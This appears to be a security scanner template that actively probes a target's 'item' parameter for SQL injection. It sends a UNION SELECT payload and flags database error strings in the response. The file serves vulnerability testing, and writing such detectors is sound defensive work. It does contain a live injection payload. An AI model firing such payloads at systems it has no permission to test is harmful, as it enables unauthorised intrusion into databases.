id: sqli7-326
name: 'UNION probe in item'
severity: high
type: active
tags:
  - sqli
  - injection
  - union
description: 'Triggers DB error via item'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      item:
        - ''')) UNION SELECT 1,2,3--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
